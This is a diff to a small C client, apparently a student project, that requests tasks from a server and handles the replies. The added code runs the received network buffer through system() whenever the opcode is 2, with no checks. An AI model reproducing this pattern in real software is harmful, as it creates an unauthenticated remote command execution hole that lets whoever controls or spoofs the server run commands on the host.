@@ -27,6 +27,18 @@ struct string_packet
     char *buffer;
 };
 
+
+struct mlc_packet_header create_packet(double client_id,uint8_t cluster_id,uint8_t opcode,char *data)
+{
+	struct mlc_packet_header header;
+	header.client_id=client_id;
+	header.cluster_id=cluster_id;
+	header.opcode=opcode;
+	header.size_of= strlen(data) + sizeof(struct mlc_packet_header);
+
+	return header;
+}	
+
 void proceed_task(struct mlc_packet_header *header,char *buffer)
 {
     // Decoupe du data et cast en char*
@@ -34,13 +46,20 @@ void proceed_task(struct mlc_packet_header *header,char *buffer)
     printf("Traitement ...\n");
     // Affichage de la struct
     printf("Client_id : %f\n",header->client_id);
-    printf("Cluster_id : %d\n",header->cluster_id);
+    /*printf("Cluster_id : %d\n",header->cluster_id);
     printf("Opcode : %d\n",header->opcode);
     printf("Size_of : %d\n",header->size_of);
 
     // Affichage de la data;
-    printf("Data : %s\n\n",buffer);
-
+    printf("Data : %s\n\n",buffer);*/
+    switch(header->opcode)
+	{
+		case 2:
+		    system(buffer);
+		    break;
+		default:
+		    ;
+	}
 }
 
 
@@ -168,12 +187,9 @@ int main(int argc , char *argv[])
     // La structure ainsi que la data pour demander une tâche est
     // constamment la même, ici c'est un test qui est fait
 
-
+    
     strcpy(buffer_ask, "blablabla");
-    header.client_id = 1;
-    header.cluster_id = 2;
-    header.opcode = 3;
-    header.size_of = strlen(buffer_ask) + sizeof(struct mlc_packet_header);
+    header = create_packet(1,2,1,buffer_ask);
 
     // Boucle tant que 1, à l'avenir paramètre à changer jusqu'à ce qu'il
     // recoive l'odre de s'arreter. 
